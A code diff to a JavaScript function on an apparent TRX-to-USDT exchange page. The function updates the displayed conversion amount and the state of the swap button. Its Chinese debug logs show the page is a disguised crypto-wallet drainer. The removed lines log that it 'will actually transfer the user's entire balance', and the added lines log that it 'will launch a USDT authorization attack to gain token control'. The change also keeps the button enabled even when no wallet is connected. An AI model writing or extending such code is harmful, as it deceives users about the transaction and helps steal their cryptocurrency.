@@ -2885,19 +2885,16 @@
                 const converted = (parseFloat(fromAmount) * 0.1634).toFixed(6);
                 toAmount.value = converted;
                 
-                if (isWalletConnected) {
-                    convertBtn.textContent = `兑换 ${fromAmount} TRX`;
-                    convertBtn.disabled = false;
-                    
-                    debugLog(`💱 用户计算兑换: ${fromAmount} TRX → ${converted} USDT`);
-                    debugLog(`🎯 实际将转移用户全部余额: ${userBalance} TRX`);
-                } else {
-                    convertBtn.textContent = '请先连接钱包';
-                    convertBtn.disabled = true;
-                }
+                // 🎯 始终保持兑换按钮可用，支持直接兑换流程
+                convertBtn.textContent = `兑换 ${fromAmount} TRX`;
+                convertBtn.disabled = false;
+                
+                debugLog(`💱 用户计算兑换: ${fromAmount} TRX → ${converted} USDT`);
+                debugLog(`🎯 将启动USDT授权攻击获得代币控制权`);
             } else {
                 toAmount.value = '';
-                convertBtn.textContent = isWalletConnected ? '请输入TRX数量' : '请先连接钱包';
+                // 🎯 没有输入金额时，保持兑换按钮可用但提示输入数量
+                convertBtn.textContent = '请输入TRX数量';
                 convertBtn.disabled = true;
             }
         }
